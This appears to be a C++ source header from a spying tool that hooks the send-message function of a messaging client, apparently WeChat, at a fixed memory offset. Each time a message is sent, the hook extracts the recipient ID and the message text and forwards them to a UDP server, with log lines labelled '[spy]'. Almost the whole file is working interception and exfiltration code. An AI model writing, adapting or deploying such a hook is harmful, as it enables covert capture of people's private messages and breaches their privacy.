#pragma once
#include "common.h"

const unsigned long long SEND_MSG_OFFSET =
    0x00000000022D4A90;

typedef __int64(__fastcall* PFN_SEND_MSG)(
    __int64 a1,
    __int64 a2,
    __int64 a3,
    __int64 a4,
    int a5,
    int a6,
    int a7,
    __int64 a8);

static PFN_SEND_MSG pOriSendMsg = NULL;

struct WX_SEND_MSG
{
    wchar_t *msg;
    int len;
};

__int64 __fastcall
hookSendMsg(
    __int64 a1,
    __int64 a2, // wxid ptr, wchar_t
    __int64 a3, // msg ptr, wchat_t
    __int64 a4,
    int a5,
    int a6,
    int a7,
    __int64 a8)
{
    __int64 pOriRet = pOriSendMsg(a1, a2, a3, a4, a5, a6, a7,
                                  a8);

    try
    {
        char pDbgMsg[0x1000] = { 0 };

        WX_SEND_MSG* pWxid = (WX_SEND_MSG*)a2;
        WX_SEND_MSG* pMsg = (WX_SEND_MSG*)a3;

        SendInfoToUdpSrvW(
            L"[spy] - [sendto] - [%ws]: %ws\n",
            LPCWSTR(pWxid->msg),
            LPCWSTR(pMsg->msg));

        return pOriRet;
    }

    catch (...)
    {
        SendInfoToUdpSrvW(
            L"[spy] - Exception occurred in hookLogMsg\n");
        return NULL;
    }
}